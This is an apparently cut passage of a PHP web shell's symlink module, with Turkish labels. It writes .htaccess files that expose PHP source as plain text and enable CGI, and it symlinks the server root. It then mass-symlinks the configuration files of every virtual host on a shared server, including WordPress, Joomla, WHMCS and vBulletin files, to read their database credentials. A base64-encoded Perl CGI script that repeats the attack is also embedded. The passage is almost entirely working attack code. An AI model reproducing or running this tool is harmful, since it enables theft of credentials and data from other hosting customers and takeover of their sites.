            system("ln -s ".$isim."/httpdocs/admin/config.php ".$rep."-OpenCart.txt");
            system("ln -s ".$isim."/httpdocs/config.php ".$rep."-OpenCart1.txt");
            system("ln -s ".$isim."/httpdocs/application/config/database.php ".$rep."-Ellislab.txt");
            system("ln -s ".$isim."/httpdocs/inc/connect.php ".$rep."-Parallels.txt");
            system("ln -s ".$isim."/httpdocs/inc/config.php ".$rep."-MyBB.txt");
            system('ln -s'.$isim.'/httpdocs/includes/configure.php'.$rep.'-shop.txt');
            system('ln -s'.$isim.'/httpdocs/os/includes/configure.php'.$rep.'-shop-os.txt');
            system('ln -s'.$isim.'/httpdocs/oscom/includes/configure.php'.$rep.'-oscom.txt');
            system('ln -s'.$isim.'/httpdocs/oscommerce/includes/configure.php'.$rep.'-oscommerce.txt');
            system('ln -s'.$isim.'/httpdocs/oscommerces/includes/configure.php'.$rep.'-oscommerces.txt');
            system('ln -s'.$isim.'/httpdocs/shop/includes/configure.php'.$rep.'-shop2.txt');
            system('ln -s'.$isim.'/httpdocs/shopping/includes/configure.php'.$rep.'-shop-shopping.txt');
            system('ln -s'.$isim.'/httpdocs/sale/includes/configure.php'.$rep.'-sale.txt');
            system('ln -s'.$isim.'/httpdocs/amember/config.inc.php'.$rep.'-amember.txt');
            system('ln -s'.$isim.'/httpdocs/config.inc.php'.$rep.'-amember2.txt');
            system('ln -s'.$isim.'/httpdocs/members/configuration.php'.$rep.'-members.txt');
            system('ln -s'.$isim.'/httpdocs/config.php'.$rep.'-4images1.txt');
            system('ln -s'.$isim.'/httpdocs/forum/includes/config.php'.$rep.'-forum.txt');
            system('ln -s'.$isim.'/httpdocs/forums/includes/config.php'.$rep.'-forums.txt');
            system('ln -s'.$isim.'/httpdocs/admin/conf.php'.$rep.'-5.txt');
            system('ln -s'.$isim.'/httpdocs/admin/config.php'.$rep.'-4.txt');
            system('ln -s'.$isim.'/httpdocs/wp-config.php'.$rep.'-wp13.txt');
            system('ln -s'.$isim.'/httpdocs/wp/wp-config.php'.$rep.'-wp13-wp.txt');
            system('ln -s'.$isim.'/httpdocs/WP/wp-config.php'.$rep.'-wp13-WP.txt');
            system('ln -s'.$isim.'/httpdocs/wp/beta/wp-config.php'.$rep.'-wp13-wp-beta.txt');
            system('ln -s'.$isim.'/httpdocs/beta/wp-config.php'.$rep.'-wp13-beta.txt');
            system('ln -s'.$isim.'/httpdocs/press/wp-config.php'.$rep.'-wp13-press.txt');
            system('ln -s'.$isim.'/httpdocs/wordpress/wp-config.php'.$rep.'-wp13-wordpress.txt');
            system('ln -s'.$isim.'/httpdocs/Wordpress/wp-config.php'.$rep.'-wp13-Wordpress.txt');
            system('ln -s'.$isim.'/httpdocs/blog/wp-config.php'.$rep.'-wp13-Wordpress.txt');
            system('ln -s'.$isim.'/httpdocs/wordpress/beta/wp-config.php'.$rep.'-wp13-wordpress-beta.txt');
            system('ln -s'.$isim.'/httpdocs/news/wp-config.php'.$rep.'-wp13-news.txt');
            system('ln -s'.$isim.'/httpdocs/new/wp-config.php'.$rep.'-wp13-new.txt');
            system('ln -s'.$isim.'/httpdocs/blog/wp-config.php'.$rep.'-wp-blog.txt');
            system('ln -s'.$isim.'/httpdocs/beta/wp-config.php'.$rep.'-wp-beta.txt');
            system('ln -s'.$isim.'/httpdocs/blogs/wp-config.php'.$rep.'-wp-blogs.txt');
            system('ln -s'.$isim.'/httpdocsln -swp-config.php'.$rep.'-wp-home.txt');
            system('ln -s'.$isim.'/httpdocs/protal/wp-config.php'.$rep.'-wp-protal.txt');
            system('ln -s'.$isim.'/httpdocs/site/wp-config.php'.$rep.'-wp-site.txt');
            system('ln -s'.$isim.'/httpdocs/main/wp-config.php'.$rep.'-wp-main.txt');
            system('ln -s'.$isim.'/httpdocs/test/wp-config.php'.$rep.'-wp-test.txt');
            system('ln -s'.$isim.'/httpdocs/arcade/functions/dbclass.php'.$rep.'-ibproarcade.txt');
            system('ln -s'.$isim.'/httpdocs/arcade/functions/dbclass.php'.$rep.'-ibproarcade.txt');
            system('ln -s'.$isim.'/httpdocs/joomla/configuration.php'.$rep.'-joomla2.txt');
            system('ln -s'.$isim.'/httpdocs/protal/configuration.php'.$rep.'-joomla-protal.txt');
            system('ln -s'.$isim.'/httpdocs/joo/configuration.php'.$rep.'-joo.txt');
            system('ln -s'.$isim.'/httpdocs/cms/configuration.php'.$rep.'-joomla-cms.txt');
            system('ln -s'.$isim.'/httpdocs/site/configuration.php'.$rep.'-joomla-site.txt');
            system('ln -s'.$isim.'/httpdocs/main/configuration.php'.$rep.'-joomla-main.txt');
            system('ln -s'.$isim.'/httpdocs/news/configuration.php'.$rep.'-joomla-news.txt');
            system('ln -s'.$isim.'/httpdocs/new/configuration.php'.$rep.'-joomla-new.txt');
            system('ln -s'.$isim.'/httpdocsln -sconfiguration.php'.$rep.'-joomla-home.txt');
            system('ln -s'.$isim.'/httpdocs/vb/includes/config.php'.$rep.'-vb-config.txt');
            system('ln -s'.$isim.'/httpdocs/vb3/includes/config.php'.$rep.'-vb3-config.txt');
            system('ln -s'.$isim.'/httpdocs/cc/includes/config.php'.$rep.'-vb1-config.txt');
            system('ln -s'.$isim.'/httpdocs/includes/config.php'.$rep.'-includes-vb.txt');
            system('ln -s'.$isim.'/httpdocs/forum/includes/class_core.php'.$rep.'-vbluttin-class_core.php.txt');
            system('ln -s'.$isim.'/httpdocs/vb/includes/class_core.php'.$rep.'-vbluttin-class_core.php1.txt');
            system('ln -s'.$isim.'/httpdocs/cc/includes/class_core.php'.$rep.'-vbluttin-class_core.php2.txt');
            system('ln -s'.$isim.'/httpdocs/whm/configuration.php'.$rep.'-whm15.txt');
            system('ln -s'.$isim.'/httpdocs/central/configuration.php'.$rep.'-whm-central.txt');
            system('ln -s'.$isim.'/httpdocs/whm/whmcs/configuration.php'.$rep.'-whm-whmcs.txt');
            system('ln -s'.$isim.'/httpdocs/whm/WHMCS/configuration.php'.$rep.'-whm-WHMCS.txt');
            system('ln -s'.$isim.'/httpdocs/whmc/WHM/configuration.php'.$rep.'-whmc-WHM.txt');
            system('ln -s'.$isim.'/httpdocs/whmcs/configuration.php'.$rep.'-whmcs.txt');
            system('ln -s'.$isim.'/httpdocs/support/configuration.php'.$rep.'-support.txt');
            system('ln -s'.$isim.'/httpdocs/supp/configuration.php'.$rep.'-supp.txt');
            system('ln -s'.$isim.'/httpdocs/secure/configuration.php'.$rep.'-sucure.txt');
            system('ln -s'.$isim.'/httpdocs/secure/whm/configuration.php'.$rep.'-sucure-whm.txt');
            system('ln -s'.$isim.'/httpdocs/secure/whmcs/configuration.php'.$rep.'-sucure-whmcs.txt');
            system('ln -s'.$isim.'/httpdocs/cpanel/configuration.php'.$rep.'-cpanel.txt');
            system('ln -s'.$isim.'/httpdocs/panel/configuration.php'.$rep.'-panel.txt');
            system('ln -s'.$isim.'/httpdocs/host/configuration.php'.$rep.'-host.txt');
            system('ln -s'.$isim.'/httpdocs/hosting/configuration.php'.$rep.'-hosting.txt');
            system('ln -s'.$isim.'/httpdocs/hosts/configuration.php'.$rep.'-hosts.txt');
            system('ln -s'.$isim.'/httpdocs/configuration.php'.$rep.'-joomla.txt');
            system('ln -s'.$isim.'/httpdocs/submitticket.php'.$rep.'-whmcs2.txt');
            system('ln -s'.$isim.'/httpdocs/clients/configuration.php'.$rep.'-clients.txt');
            system('ln -s'.$isim.'/httpdocs/client/configuration.php'.$rep.'-client.txt');
            system('ln -s'.$isim.'/httpdocs/clientes/configuration.php'.$rep.'-clientes.txt');
            system('ln -s'.$isim.'/httpdocs/cliente/configuration.php'.$rep.'-client.txt');
            system('ln -s'.$isim.'/httpdocs/clientsupport/configuration.php'.$rep.'-clientsupport.txt');
            system('ln -s'.$isim.'/httpdocs/billing/configuration.php'.$rep.'-billing.txt'); 
            system('ln -s'.$isim.'/httpdocs/manage/configuration.php'.$rep.'-whm-manage.txt'); 
            system('ln -s'.$isim.'/httpdocs/my/configuration.php'.$rep.'-whm-my.txt'); 
            system('ln -s'.$isim.'/httpdocs/myshop/configuration.php'.$rep.'-whm-myshop.txt'); 
            system('ln -s'.$isim.'/httpdocs/includes/dist-configure.php'.$rep.'-zencart.txt'); 
            system('ln -s'.$isim.'/httpdocs/zencart/includes/dist-configure.php'.$rep.'-shop-zencart.txt'); 
            system('ln -s'.$isim.'/httpdocs/shop/includes/dist-configure.php'.$rep.'-shop-ZCshop.txt'); 
            system('ln -s'.$isim.'/httpdocs/Settings.php'.$rep.'-smf.txt'); 
            system('ln -s'.$isim.'/httpdocs/smf/Settings.php'.$rep.'-smf2.txt'); 
            system('ln -s'.$isim.'/httpdocs/forum/Settings.php'.$rep.'-smf-forum.txt'); 
            system('ln -s'.$isim.'/httpdocs/forums/Settings.php'.$rep.'-smf-forums.txt'); 
            system('ln -s'.$isim.'/httpdocs/upload/includes/config.php'.$rep.'-up.txt');
            system('ln -s'.$isim.'/httpdocs/article/config.php'.$rep.'-Nwahy.txt'); 
            system('ln -s'.$isim.'/httpdocs/up/includes/config.php'.$rep.'-up2.txt');
            system('ln -s'.$isim.'/httpdocs/conf_global.php'.$rep.'-6.txt');
            system('ln -s'.$isim.'/httpdocs/include/db.php'.$rep.'-7.txt');
            system('ln -s'.$isim.'/httpdocs/connect.php'.$rep.'-PHP-Fusion.txt');
            system('ln -s'.$isim.'/httpdocs/mk_conf.php'.$rep.'-9.txt');
            system('ln -s'.$isim.'/httpdocs/includes/config.php'.$rep.'-traidnt1.txt');
            system('ln -s'.$isim.'/httpdocs/config.php'.$rep.'-4images.txt');
            system('ln -s'.$isim.'/httpdocs/sites/default/settings.php'.$rep.'-Drupal.txt');
            system('ln -s'.$isim.'/httpdocs/member/configuration.php'.$rep.'-1member.txt') ; 
            system('ln -s'.$isim.'/httpdocs/billings/configuration.php'.$rep.'-billings.txt') ; 
            system('ln -s'.$isim.'/httpdocs/whm/configuration.php'.$rep.'-whm.txt');
            system('ln -s'.$isim.'/httpdocs/supports/configuration.php'.$rep.'-supports.txt');
            system('ln -s'.$isim.'/httpdocs/requires/config.php'.$rep.'-AM4SS-hosting.txt');
            system('ln -s'.$isim.'/httpdocs/supports/includes/iso4217.php'.$rep.'-hostbills-supports.txt');
            system('ln -s'.$isim.'/httpdocs/client/includes/iso4217.php'.$rep.'-hostbills-client.txt');
            system('ln -s'.$isim.'/httpdocs/support/includes/iso4217.php'.$rep.'-hostbills-support.txt');
            system('ln -s'.$isim.'/httpdocs/billing/includes/iso4217.php'.$rep.'-hostbills-billing.txt');
            system('ln -s'.$isim.'/httpdocs/billings/includes/iso4217.php'.$rep.'-hostbills-billings.txt');
            system('ln -s'.$isim.'/httpdocs/host/includes/iso4217.php'.$rep.'-hostbills-host.txt');
            system('ln -s'.$isim.'/httpdocs/hosts/includes/iso4217.php'.$rep.'-hostbills-hosts.txt');
            system('ln -s'.$isim.'/httpdocs/hosting/includes/iso4217.php'.$rep.'-hostbills-hosting.txt');
            system('ln -s'.$isim.'/httpdocs/hostings/includes/iso4217.php'.$rep.'-hostbills-hostings.txt');
            system('ln -s'.$isim.'/httpdocs/includes/iso4217.php'.$rep.'-hostbills.txt');
            system('ln -s'.$isim.'/httpdocs/hostbills/includes/iso4217.php'.$rep.'-hostbills-hostbills.txt');
            system('ln -s'.$isim.'/httpdocs/hostbill/includes/iso4217.php'.$rep.'-hostbills-hostbill.txt');
    }
}
echo("<center><a target='__newblank' href='htdocs-sömürüldü2/root/'><q>Root</q></a></center>");
echo("<hr>");
echo("<center><a target='___newblank' href='htdocs-sömürüldü2/symlinkler/'><q>symlinkler</q></a></center>");
}
if(isset($_POST['VHOSTS-SYMLİNK'])){
    $hta ="Options Indexes Follow symlinks
    DirectoryIndex ngeue.htm
    AddType text/plain .php
    AddHandler text/plain .php
    Satisfy Any";
    mkdir("vhots-sömürüldü");
    chdir("vhots-sömürüldü");
    @file_put_contents(".htaccess",$hta);
    system("ln -s / root");
    mkdir("symlinkler");
    chdir("symlinkler");
    @file_put_contents(".htaccess",$hta);
    unset($hta);
    foreach($_POST['passwd'] as $pwd){
        $pawd=explode(":",$pwd);
        $sitess = $pawd[0];
        symlink('/var/www/vhosts/'.$sitess.'/httpdocs/includes/configure.php',$sitess.'-shop.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/os/includes/configure.php',$sitess.'-shop-os.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/oscom/includes/configure.php',$sitess.'-oscom.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/oscommerce/includes/configure.php',$sitess.'-oscommerce.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/oscommerces/includes/configure.php',$sitess.'-oscommerces.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/shop/includes/configure.php',$sitess.'-shop2.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/shopping/includes/configure.php',$sitess.'-shop-shopping.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/sale/includes/configure.php',$sitess.'-sale.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/amember/config.inc.php',$sitess.'-amember.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/config.inc.php',$sitess.'-amember2.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/members/configuration.php',$sitess.'-members.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/config.php',$sitess.'-4images1.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/forum/includes/config.php',$sitess.'-forum.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/forums/includes/config.php',$sitess.'-forums.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/admin/conf.php',$sitess.'-5.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/admin/config.php',$sitess.'-4.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/wp-config.php',$sitess.'-wp13.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/wp/wp-config.php',$sitess.'-wp13-wp.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/WP/wp-config.php',$sitess.'-wp13-WP.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/wp/beta/wp-config.php',$sitess.'-wp13-wp-beta.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/beta/wp-config.php',$sitess.'-wp13-beta.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/press/wp-config.php',$sitess.'-wp13-press.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/wordpress/wp-config.php',$sitess.'-wp13-wordpress.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/Wordpress/wp-config.php',$sitess.'-wp13-Wordpress.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/blog/wp-config.php',$sitess.'-wp13-Wordpress.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/wordpress/beta/wp-config.php',$sitess.'-wp13-wordpress-beta.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/news/wp-config.php',$sitess.'-wp13-news.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/new/wp-config.php',$sitess.'-wp13-new.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/blog/wp-config.php',$sitess.'-wp-blog.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/beta/wp-config.php',$sitess.'-wp-beta.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/blogs/wp-config.php',$sitess.'-wp-blogs.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/home/wp-config.php',$sitess.'-wp-home.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/protal/wp-config.php',$sitess.'-wp-protal.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/site/wp-config.php',$sitess.'-wp-site.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/main/wp-config.php',$sitess.'-wp-main.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/test/wp-config.php',$sitess.'-wp-test.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/arcade/functions/dbclass.php',$sitess.'-ibproarcade.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/arcade/functions/dbclass.php',$sitess.'-ibproarcade.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/joomla/configuration.php',$sitess.'-joomla2.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/protal/configuration.php',$sitess.'-joomla-protal.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/joo/configuration.php',$sitess.'-joo.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/cms/configuration.php',$sitess.'-joomla-cms.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/site/configuration.php',$sitess.'-joomla-site.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/main/configuration.php',$sitess.'-joomla-main.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/news/configuration.php',$sitess.'-joomla-news.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/new/configuration.php',$sitess.'-joomla-new.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/home/configuration.php',$sitess.'-joomla-home.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/vb/includes/config.php',$sitess.'-vb~config.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/vb3/includes/config.php',$sitess.'-vb3~config.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/cc/includes/config.php',$sitess.'-vb1~config.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/includes/config.php',$sitess.'-includes-vb.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/forum/includes/class_core.php',$sitess.'-vbluttin~class_core.php.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/vb/includes/class_core.php',$sitess.'-vbluttin~class_core.php1.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/cc/includes/class_core.php',$sitess.'-vbluttin~class_core.php2.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/whm/configuration.php',$sitess.'-whm15.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/central/configuration.php',$sitess.'-whm-central.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/whm/whmcs/configuration.php',$sitess.'-whm-whmcs.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/whm/WHMCS/configuration.php',$sitess.'-whm-WHMCS.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/whmc/WHM/configuration.php',$sitess.'-whmc-WHM.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/whmcs/configuration.php',$sitess.'-whmcs.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/support/configuration.php',$sitess.'-support.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/supp/configuration.php',$sitess.'-supp.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/secure/configuration.php',$sitess.'-sucure.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/secure/whm/configuration.php',$sitess.'-sucure-whm.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/secure/whmcs/configuration.php',$sitess.'-sucure-whmcs.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/cpanel/configuration.php',$sitess.'-cpanel.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/panel/configuration.php',$sitess.'-panel.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/host/configuration.php',$sitess.'-host.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/hosting/configuration.php',$sitess.'-hosting.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/hosts/configuration.php',$sitess.'-hosts.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/configuration.php',$sitess.'-joomla.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/submitticket.php',$sitess.'-whmcs2.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/clients/configuration.php',$sitess.'-clients.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/client/configuration.php',$sitess.'-client.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/clientes/configuration.php',$sitess.'-clientes.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/cliente/configuration.php',$sitess.'-client.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/clientsupport/configuration.php',$sitess.'-clientsupport.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/billing/configuration.php',$sitess.'-billing.txt'); 
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/manage/configuration.php',$sitess.'-whm-manage.txt'); 
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/my/configuration.php',$sitess.'-whm-my.txt'); 
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/myshop/configuration.php',$sitess.'-whm-myshop.txt'); 
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/includes/dist-configure.php',$sitess.'-zencart.txt'); 
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/zencart/includes/dist-configure.php',$sitess.'-shop-zencart.txt'); 
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/shop/includes/dist-configure.php',$sitess.'-shop-ZCshop.txt'); 
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/Settings.php',$sitess.'-smf.txt'); 
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/smf/Settings.php',$sitess.'-smf2.txt'); 
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/forum/Settings.php',$sitess.'-smf-forum.txt'); 
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/forums/Settings.php',$sitess.'-smf-forums.txt'); 
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/upload/includes/config.php',$sitess.'-up.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/article/config.php',$sitess.'-Nwahy.txt'); 
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/up/includes/config.php',$sitess.'-up2.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/conf_global.php',$sitess.'-6.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/include/db.php',$sitess.'-7.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/connect.php',$sitess.'-PHP-Fusion.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/mk_conf.php',$sitess.'-9.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/includes/config.php',$sitess.'-traidnt1.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/config.php',$sitess.'-4images.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/sites/default/settings.php',$sitess.'-Drupal.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/member/configuration.php',$sitess.'-1member.txt') ; 
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/billings/configuration.php',$sitess.'-billings.txt') ; 
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/whm/configuration.php',$sitess.'-whm.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/supports/configuration.php',$sitess.'-supports.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/requires/config.php',$sitess.'-AM4SS-hosting.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/supports/includes/iso4217.php',$sitess.'-hostbills-supports.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/client/includes/iso4217.php',$sitess.'-hostbills-client.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/support/includes/iso4217.php',$sitess.'-hostbills-support.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/billing/includes/iso4217.php',$sitess.'-hostbills-billing.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/billings/includes/iso4217.php',$sitess.'-hostbills-billings.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/host/includes/iso4217.php',$sitess.'-hostbills-host.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/hosts/includes/iso4217.php',$sitess.'-hostbills-hosts.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/hosting/includes/iso4217.php',$sitess.'-hostbills-hosting.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/hostings/includes/iso4217.php',$sitess.'-hostbills-hostings.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/includes/iso4217.php',$sitess.'-hostbills.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/hostbills/includes/iso4217.php',$sitess.'-hostbills-hostbills.txt');
symlink('/var/www/vhosts/'.$sitess.'/httpdocs/hostbill/includes/iso4217.php',$sitess.'-hostbills-hostbill.txt');
    }
echo("<center><a target='__newblank' href='vhots-sömürüldü/root/'><q>Root</q></a></center>");
echo("<hr>");
echo("<center><a target='___newblank' href='vhots-sömürüldü/symlinkler/'><q>symlinkler</q></a></center>");
}
if(isset($_POST['VHOSTS-SYMLİNK2'])){
    mkdir("vhots-sömürüldü2");
    chdir("vhots-sömürüldü2");
    $hta ="Options Indexes Follow symlinks
    DirectoryIndex ngeue.htm
    AddType text/plain .php
    AddHandler text/plain .php
    Satisfy Any";
    @file_put_contents(".htaccess",$hta);
    system("ln -s / root");
    mkdir("symlinkler");
    chdir("symlinkler");
    $hta = "
    Options Follow symlinks MultiViews Indexes ExecCGI

	AddType application/x-httpd-cgi .cin

	AddHandler cgi-script .cin
    AddHandler cgi-script .cin";
    @file_put_contents(".htaccess",$hta);
    unset($hta);
    $vhost = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyIgLz4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPC9oZWFkPg0KJzsNCnByaW50ICcNCm9wZW5kaXIobXkgJGRpciAsICIvdmFyL3d3dy92aG9zdHMvIik7DQpmb3JlYWNoKHNvcnQgcmVhZGRpciAkZGlyKSB7DQogICAgbXkgJGlzRGlyID0gMDsNCiAgICAkaXNEaXIgPSAxIGlmIC1kICRfOw0KJHNpdGVzcyA9ICRfOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLW9zLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1vc2NvbS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1vc2NvbW1lcmNlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL29zY29tbWVyY2VzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1vc2NvbW1lcmNlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaG9wL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaG9wcGluZy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1zaG9wcGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zYWxlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FtZW1iZXIvY29uZmlnLmluYy5waHAnLCRzaXRlc3MuJy1hbWVtYmVyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy5pbmMucGhwJywkc2l0ZXNzLictYW1lbWJlcjIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY